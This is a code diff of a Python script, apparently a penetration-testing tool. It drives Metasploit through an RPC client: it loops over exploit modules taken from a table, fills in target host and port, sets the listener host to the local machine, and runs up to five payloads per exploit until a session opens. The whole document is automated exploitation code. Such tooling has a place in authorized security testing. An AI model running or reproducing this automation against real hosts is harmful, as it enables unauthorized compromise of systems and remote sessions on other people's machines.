@@ -45,7 +45,7 @@ f.write('Host IP: {0} \n'.format(IP))
 # Cross Platform way to get the following info about our machine
 for i in netifaces.interfaces():
    try:
-      if netifaces.ifaddresses(i)[netifaces.AF_INET][0]['addr'].startswith("192") or netifaces.ifaddresses(i)[netifaces.AF_INET][0]['addr'].startswith("10") or netifaces.ifaddresses(i)[netifaces.AF_INET][0]['addr'].startswith("172"):
+      if netifaces.ifaddresses(i)[netifaces.AF_INET][0]['addr'] == IP: # .startswith("192") or netifaces.ifaddresses(i)[netifaces.AF_INET][0]['addr'].startswith("10") or netifaces.ifaddresses(i)[netifaces.AF_INET][0]['addr'].startswith("172")
          f.write("Operating System: {0} \n".format(platform.system()))
          netmask = netifaces.ifaddresses(i)[netifaces.AF_INET][0]['netmask']
          f.write("Network Mask: {0} \n".format(netmask))
@@ -161,111 +161,57 @@ def exploitHost(host):
 				for index, row in df.iterrows():
 					if len(client.sessions.list) < 1:
 						result = "Fail"
-						keepRunning = True
 						global lport
 						lport += 1 # increment lport so that modules arent trying to use the same lport
 						exploitName = row['Name'][8:]
 						print("  Attempting module: " + exploitName)
 						exploitObj = client.modules.use('exploit', exploitName)
-						if len(exploitObj.payloads) >= 1:
-							for item in exploitObj.options:
-								if 'rhost' in str(item).lower():
-									exploitObj[item] = host
-								elif 'rport' in str(item).lower():
-										exploitObj[item] = port
-								elif 'lport' in str(item).lower():
-										exploitObj[item] = lport
-								# elif:
-								# 	'rport' in str(item).lower():
-								# 		exploitObj[item] = port
-								# elif:
-								# 	'rport' in str(item).lower():
-								# 		exploitObj[item] = port
-							# try: # set remote host
-							# 	exploitObj['RHOSTS'] = host
-							# except:
-							# 	try:
-							# 		exploitObj['RHOST'] = host
-							# 	except:
-							# 		pass
-							# try: # set port number
-							# 	exploitObj['RPORT'] = port
-							# except:
-							# 	try:
-							# 		exploitObj['RPORTS'] = port
-							# 	except:
-							# 		pass
+						for item in exploitObj.options:
+							if 'rhost' in str(item).lower():
+								exploitObj[item] = host
+							elif 'rport' in str(item).lower():
+									exploitObj[item] = port
 
-							if len(exploitObj.missing_required) > 0:
-								for item in exploitObj.missing_required:
-									print("    Item not set: " + item)
-								print("    Exiting exploit: " + exploitName)
-								keepRunning = False
+						if len(exploitObj.missing_required) > 0:
+							for item in exploitObj.missing_required:
+								print("    Item not set: " + item)
+							print("    Exiting exploit: " + exploitName)
 
-							i = 0
-							while (i < len(exploitObj.payloads) and i < 5) and keepRunning == True and len(client.sessions.list) < 1:
-								try:
-									payloadName = exploitObj.payloads[i]
-									payloadObj = client.modules.use('payload', payloadName)
-									for item in payloadObj.options:
-										if 'rhost' in str(item).lower():
-											payloadObj[item] = host
-										elif 'rport' in str(item).lower():
-												payloadObj[item] = port
-										elif 'lport' in str(item).lower():
-												payloadObj[item] = lport
-										elif 'lhost' in str(item).lower():
-												payloadObj[item] = IP
-									# try: # set remote host
-									# 	payloadObj['RHOSTS'] = host
-									# except:
-									# 	try:
-									# 		payloadObj['RHOST'] = host
-									# 	except:
-									# 		pass
-									# try: # set port number
-									# 	payloadObj['RPORT'] = port
-									# except:
-									# 	try:
-									# 		payloadObj['RPORTS'] = port
-									# 	except:
-									# 		pass
-									# 	try: # set port number
-									# 		payloadObj['LPORT'] = lport
-									# 	except:
-									# 		try:
-									# 			payloadObj['LPORTS'] = lport
-									# 		except:
-									# 			pass
-									# try: # set port number
-									# 	payloadObj['LHOST'] = IP
-									# except:
-									# 	try:
-									# 		payloadObj['LHOST'] = IP
-									# 	except:
-									# 		pass
-
-									print("    Trying payload: " + payloadName)
-									if len(payloadObj.missing_required) > 0:
-										for item in payloadObj.missing_required:
-											print("      Item not set: " + item)
-										print("      Exiting payload: " + payloadName)
-										i += 1
-									else:
-										try:
-											exploitObj.execute(payload=payloadObj)
-											hostExploits = {"IP":host, 'Service':service, 'Port':str(port), 'Exploit':exploitName, 'Payload':str(payloadName), 'Result':result}
-											exploitObjects.append(hostExploits)
-											i += 1
-										except:
-											print("      Bad Payload. Moving on.")
-											i += 1
-
-								except Exception as e:
-									print(e)
-									i += 1
 						else:
-							print("  No payloads available for: " + exploitName)
+							if len(exploitObj.targetpayloads()) > 0:
+								i = 0
+								while (i < len(exploitObj.targetpayloads()) and i < 5) and len(client.sessions.list) < 1:
+									try:
+										payloadName = exploitObj.targetpayloads()[i]
+										payloadObj = client.modules.use('payload', payloadName)
+										for item in payloadObj.options:
+											if 'rhost' in str(item).lower():
+												payloadObj[item] = host
+											elif 'rport' in str(item).lower():
+													payloadObj[item] = port
+											elif 'lhost' in str(item).lower():
+													payloadObj[item] = IP
+
+										print("    Trying payload: " + payloadName)
+										if len(payloadObj.missing_required) > 0:
+											for item in payloadObj.missing_required:
+												print("      Item not set: " + item)
+											print("      Exiting payload: " + payloadName)
+											i += 1
+										else:
+											try:
+												exploitObj.execute(payload=payloadObj)
+												hostExploits = {"IP":host, 'Service':service, 'Port':str(port), 'Exploit':exploitName, 'Payload':str(payloadName), 'Result':result}
+												exploitObjects.append(hostExploits)
+												i += 1
+											except:
+												print("      Bad Payload. Moving on.")
+												i += 1
+									except Exception as e:
+										print(e)
+										i += 1
+							else: # No payloads available so try exploit without any
+								print("  No payloads available. ")
 					else:
 						print("  Session was found. Exiting modules for current service.")
 						break
